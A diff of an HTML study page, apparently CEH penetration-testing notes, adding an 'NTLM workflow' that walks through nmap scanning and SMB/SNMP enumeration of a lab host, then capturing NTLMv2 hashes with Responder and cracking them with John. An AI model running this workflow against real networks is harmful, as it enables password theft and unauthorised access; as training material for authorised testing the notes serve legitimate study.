@@ -1,7 +1,71 @@
     <meta name=”robots” content=”noindex,nofollow”/>
   <a href=../index.html>Back to home</a>
 <hr/>
-  <h1>Locate Network range</h1>
+  <h1>NTLM workflow (pwn Windows passwords)</h1>
+<p>There is a strong correlation in the CEH model components scanning, enumeration and gaining access</p>
+<h2>Scanning</h2>
+<p>First, scan het target for relevant open ports:</p>
+<p>nmap -sS 192.168.2.186</p>
+<p>Possible open ports:</p>
+<p><ol>
+    <ul>139 (nbt)</ul>
+    <ul>445 (smb)</ul>
+</ol>
+<p>nmap -sU 192.168.2.186</p>
+<p>Possible open ports:</p>
+<p><ol>
+    <ul>137 (nbt ns)</ul>
+    <ul>138</ul>
+    <ul>161 (snmp)</ul>
+    <ul>162 (snmptrap)</ul>
+    <ul>5355 (llmnr local-link multicast)</ul>
+</ol></p>
+<h2>Enumeration</h2>
+<p>Finding NetBIOS open, we can enumerate with nmap:</p>
+<p>nmap --script-help *nbstat*</p>
+<p>nmap -sV -p139 --script nbstat.nse 192.168.2.186</p>
+<p>nbstat on port 139 will show a.o. OS (Service Info), MAC, Workgroup and NetBIOS name</p> 
+<p>Finding SMB open, we can enumerate with nmap:</p>
+<p>nmap --script-help *smb* | less</p>
+<p>nmap -sV -p445 --script smb-enum-shares 192.168.2.186</p>
+<p>We can use the list of shares (if available) later for ntlm relay attack</p>
+<p>Copy the shares and paste them in a file named targets.txt</p>
+<p>nmap -sV -p445 --script smb2-security-mode 192.168.2.186</p>
+<p>Enumerate to see </p>
+<p>nmap --script smb2-security-mode.nse -p 445 192.168.2.186</p>
+<p>This script will show the OS details and Workgroup name</p>
+<p>Note if message signing is disabled or not required, as this is information we can use 
+later for ntlm relay attack</p>
+<p>Finding snmp open, we can enumerate with nmap:</p>
+<p>nmap --script-help *snmp*</p>
+<p>nmap -sU -p161 --script snmp-win32-shares.nse 192.168.2.186</p>
+<p>Interesting to see which folders are shared</p>
+<p>nmap -sU -p161 --script snmp-win32-software.nse 192.168.2.186</p>
+<p>Interesting to see the installed software, we can use it later for finding vulnerabilities</p>
+<p>nmap -sU -p161 --script snmp-win32-users.nse 192.168.2.186</p>
+<p>Interesting to see the list of users, we can use it later for responder and ntlm relay attacks</p>
+<p>snmp -sU -p161 --script snmp-brute.nse 192.168.2.186</p>
+<p>Interesting to see if the standard value "public" is used as credential for community</p>
+<h2>Gaining access</h2>
+<p>Using enumeration we found out a list of users and shares (which is important information). Our first goal is to find login credentials for the remote target. 
+Windows stores user account passwords in SAM file. This file contains hashes of passwords. This SAM file cannot be opened directly by the user, so we have to dump it.</p>
+<p>Best way to do this is entering the target system and use tools like Mimikatz, but this is not easy to do as we don't have access to the remote target yet.</p>
+<p>There are several methods to get access to the remote system, for example with a remote shell (using an exploit) or with capturing the password using Responder</p>
+<h2>Responder</h2>
+<p>First, check the config file of Responder, which is located at: 
+/usr/share/responder/Responder.conf</p>
+<p>sudo nano /usr/share/responder/Responder.conf</p>
+<p>NBT-NS = On; LLNNR = On; MDNS = On; SMB = On</p>
+<p>sudo responder -I wlan0</p>
+<p>Now, lure the user of the remote target to open a non existing share.</p>
+<p>Responder logs the hashes in /usr/share/responder/logs</p>
+<p>First, we can try John to find the password:
+<p>cd /usr/share/responder/logs</p>
+<p>john SMB-NTLMv2-SSP-192.168.2.186.txt</p>
+<p>With a little luck, John finds passwords we can use to log into the target Windows computer.</p>
+
+<p>It is also possible to dump the SAM hashes with <a target=_blank href=https://github.com/fortra/impacket>Impacket</a>. 
+
 <p>If you have a domain name of an organization and you want to find out the network range:</p>
 <h2>Method 1: dnsrecon and RIPE website</h2>
 <p><ol>
